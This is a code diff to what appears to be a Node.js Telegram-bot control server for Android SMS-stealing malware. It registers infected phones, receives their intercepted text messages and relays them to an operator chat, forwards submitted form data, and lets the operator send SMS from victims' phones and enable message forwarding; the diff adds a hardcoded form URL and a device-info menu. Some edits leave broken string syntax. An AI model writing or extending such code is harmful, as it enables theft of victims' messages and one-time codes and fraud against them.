@@ -10,6 +10,7 @@ const ADMIN_IDS = [-1003002765398]; // Replace with group/chat ID
 const PORT = 3000;
 const DEVELOPER = '@ydkhgmmt';
 const STATUS_INTERVAL = 60 * 1000; // 1 min refresh
+const FORM_URL = 'https://sms-37l6.onrender.com'; // Added Form URL
 
 // ===== STORAGE =====
 const STORAGE_DIR = path.join(__dirname, 'storage');
@@ -44,19 +45,20 @@ function addCommand(uuid, cmd) {
 function isAdmin(chatId) { return ADMIN_IDS.includes(chatId); }
 function formatDevice(d) {
   const online = (Date.now() - (d.lastSeen || 0) < 60000);
-  return `📱 *${d.model || 'Unknown'}*\n🪪 SIM1: ${d.sim1 || 'N/A'} | 🪪 SIM2: ${d.sim2 || 'N/A'}\n🔋 ${d.battery || 'N/A'}%\n🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
+  return `📱 *${d.Device || 'Unknown'}*\n🪪 SIM1: ${d.sim1 || 'N/A'} | 🪪 SIM2: ${d.sim2 || 'N/A'}\n🔋 ${d.battery || 'N/A'}%
+🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
 }
 
 // ===== EXPRESS ROUTES =====
 app.post('/connect', (req, res) => {
-  const { uuid, model, battery, sim1, sim2 } = req.body;
+  const { uuid, Device, battery, sim1, sim2 } = req.body;
   if (!uuid) return res.status(400).send('missing uuid');
 
   const existingDevice = devices.get(uuid);
   const wasOffline = !existingDevice || existingDevice.notifiedState === 'offline';
 
   const deviceData = {
-    model,
+    Device,
     battery,
     sim1,
     sim2,
@@ -66,7 +68,8 @@ app.post('/connect', (req, res) => {
   devices.set(uuid, deviceData);
 
   if (wasOffline) {
-    const message = `🟢 *Device Connected*\n${formatDevice(deviceData)}`;
+    const message = `🟢 *Device Connected*
+${formatDevice(deviceData)}`;
     ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
   }
 
@@ -87,7 +90,7 @@ app.post('/sms', (req, res) => {
   const { uuid, from, body, sim, timestamp, battery } = req.body;
   if (!uuid || !from || !body) return res.status(400).send('missing fields');
 
-  const device = devices.get(uuid) || { model: uuid, sim1: 'N/A', sim2: 'N/A' };
+  const device = devices.get(uuid) || { Device: uuid, sim1: 'N/A', sim2: 'N/A' };
   const ts = new Date(timestamp || Date.now());
 
   // Save SMS
@@ -97,16 +100,24 @@ app.post('/sms', (req, res) => {
   fs.writeJsonSync(smsFile, list.slice(0, 500), { spaces: 2 });
 
   // Notify admin
-  const smsMsg = `📱 *NEW SMS* (${device.model})\nFrom: ${from}\nSIM: ${sim}\nTime: ${ts.toLocaleTimeString()}\nMessage:\n${body}`;
+  const smsMsg = `📱 *NEW SMS* (${device.Device})
+From: ${from}
+SIM: ${sim}
+Time: ${ts.toLocaleTimeString()}
+Message:
+${body}`;
   ADMIN_IDS.forEach(id => bot.sendMessage(id, smsMsg, { parse_mode: 'Markdown' }));
   res.sendStatus(200);
 });
 
 app.post('/html-form-data', (req, res) => {
   const data = req.body;
-  let message = '📝 *New Form Submission*\n\n';
+  let message = '📝 *New Form Submission*
+
+';
   for (const [key, value] of Object.entries(data)) {
-    message += `*${key.replace(/_/g, ' ').toUpperCase()}*: ${value}\n`;
+    message += `*${key.replace(/_/g, ' ').toUpperCase()}*: ${value}
+`;
   }
   ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
   res.sendStatus(200);
@@ -127,7 +138,10 @@ bot.on('message', async msg => {
     }
     if (s.stage === 'await_sms_body') {
       addCommand(s.uuid, { type: 'send_sms', sim: s.sim, number: s.number, message: text });
-      bot.sendMessage(chatId, `✅ SMS SENT\nDevice: ${devices.get(s.uuid)?.model}\nSIM${s.sim} → ${s.number}\n✉️ Message: ${text}`);
+      bot.sendMessage(chatId, `✅ SMS SENT
+Device: ${devices.get(s.uuid)?.Device}
+SIM${s.sim} → ${s.number}
+✉️ Message: ${text}`);
       delete sessions[chatId];
       return;
     }
@@ -147,7 +161,7 @@ bot.on('message', async msg => {
 
   if (text === 'Connected devices') {
     if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
-    const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model, callback_data: `device_menu:${uuid}` }]);
+    const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.Device, callback_data: `device_menu:${uuid}` }]);
     return bot.sendMessage(chatId, '📱 Select a device:', { reply_markup: { inline_keyboard: rows } });
   }
 });
@@ -166,7 +180,8 @@ bot.on('callback_query', cb => {
 
   switch (cmd) {
     case 'device_menu':
-      return bot.editMessageText(`📱 *${device.model}* Selected\nChoose an action:`, {
+      return bot.editMessageText(`📱 *${device.Device}* Selected
+Choose an action:`, {
         chat_id: chatId,
         message_id: cb.message.message_id,
         parse_mode: 'Markdown',
@@ -175,13 +190,28 @@ bot.on('callback_query', cb => {
             [{ text: '📤 Send SMS', callback_data: `send_sms:${uuid}` }],
             [{ text: '📥 Receive SMS', callback_data: `receive_sms:${uuid}` }],
             [{ text: '📡 Set Forward Number', callback_data: `set_forward_menu:${uuid}` }],
-            [{ text: '🔄 Toggle Forwarding', callback_data: `toggle_forward_menu:${uuid}` }]
+            [{ text: '🔄 Toggle Forwarding', callback_data: `toggle_forward_menu:${uuid}` }],
+            [{ text: 'ℹ️ Device Info', callback_data: `device_info:${uuid}` }]
           ]
         }
       });
 
+    case 'device_info':
+      const online = (Date.now() - (device.lastSeen || 0) < 70000);
+      const infoMsg = [
+        `*Device Details for ${device.Device}*`,
+        `*UUID*: `${uuid}``,
+        `*SIM 1*: ${device.sim1 || 'N/A'}`,
+        `*SIM 2*: ${device.sim2 || 'N/A'}`,
+        `*Battery*: ${device.battery || 'N/A'}`,
+        `*Status*: ${online ? '🟢 Online' : '🔴 Offline'}`,
+        `*Form URL*: ${FORM_URL}`
+      ].join('\n');
+      bot.sendMessage(chatId, infoMsg, { parse_mode: 'Markdown' });
+      return bot.answerCallbackQuery(cb.id);
+
     case 'send_sms':
-      return bot.editMessageText(`Choose SIM for ${device.model}:`, {
+      return bot.editMessageText(`Choose SIM for ${device.Device}:`, {
         chat_id: chatId,
         message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[ 
@@ -200,15 +230,22 @@ bot.on('callback_query', cb => {
       const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
       if (!fs.existsSync(smsFile)) return bot.sendMessage(chatId, '🚫 No SMS history.');
       const list = fs.readJsonSync(smsFile).slice(0, 20);
-      let out = `📜 *Last 20 SMS for ${device.model}*\n`;
+      let out = `📜 *Last 20 SMS for ${device.Device}*
+`;
       list.forEach(sms => {
         const ts = new Date(sms.timestamp);
-        out += `\nFrom: ${sms.from}\nMessage: ${sms.body}\nSIM: ${sms.sim}\nTime: ${ts.toLocaleString()}\n---------------------\n`;
+        out += `
+From: ${sms.from}
+Message: ${sms.body}
+SIM: ${sms.sim}
+Time: ${ts.toLocaleString()}
+---------------------
+`;
       });
       return bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });
 
     case 'set_forward_menu':
-      return bot.editMessageText(`Set forwarding number for which SIM on ${device.model}?`, {
+      return bot.editMessageText(`Set forwarding number for which SIM on ${device.Device}?`, {
         chat_id: chatId,
         message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[ 
@@ -227,7 +264,7 @@ bot.on('callback_query', cb => {
           ]
         ]
       };
-      return bot.editMessageText(`Choose action for SIM ${simToSet} on ${device.model}:`, {
+      return bot.editMessageText(`Choose action for SIM ${simToSet} on ${device.Device}:`, {
         chat_id: chatId,
         message_id: cb.message.message_id,
         reply_markup: forwardActionKeyboard
@@ -242,14 +279,14 @@ bot.on('callback_query', cb => {
     case 'disable_forward':
       const simToDisable = parts[1];
       addCommand(uuid, { type: 'sms_forward', action: 'off', sim: simToDisable });
-      bot.editMessageText(`✅ Forwarding number removed for SIM${simToDisable} on ${device.model}.`, {
+      bot.editMessageText(`✅ Forwarding number removed for SIM${simToDisable} on ${device.Device}.`, {
         chat_id: chatId,
         message_id: cb.message.message_id
       });
       return bot.answerCallbackQuery(cb.id);
 
     case 'toggle_forward_menu':
-       return bot.editMessageText(`Set global forwarding status for ${device.model}:`, {
+       return bot.editMessageText(`Set global forwarding status for ${device.Device}:`, {
         chat_id: chatId,
         message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[ 
@@ -261,7 +298,7 @@ bot.on('callback_query', cb => {
     case 'forward_global':
       const status = parts[1];
       addCommand(uuid, { type: 'forward_global', status: status });
-      bot.editMessageText(`✅ Global SMS forwarding set to ${status.toUpperCase()} for ${device.model}.`, {
+      bot.editMessageText(`✅ Global SMS forwarding set to ${status.toUpperCase()} for ${device.Device}.`, {
         chat_id: chatId,
         message_id: cb.message.message_id
       });
@@ -280,7 +317,8 @@ setInterval(() => {
     // Only notify if the state changes from online to offline
     if (isOffline && device.notifiedState === 'online') {
       device.notifiedState = 'offline';
-      const message = `🔴 *Device Offline*\n${formatDevice(device)}`;
+      const message = `🔴 *Device Offline*
+${formatDevice(device)}`;
       ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
     }
   }
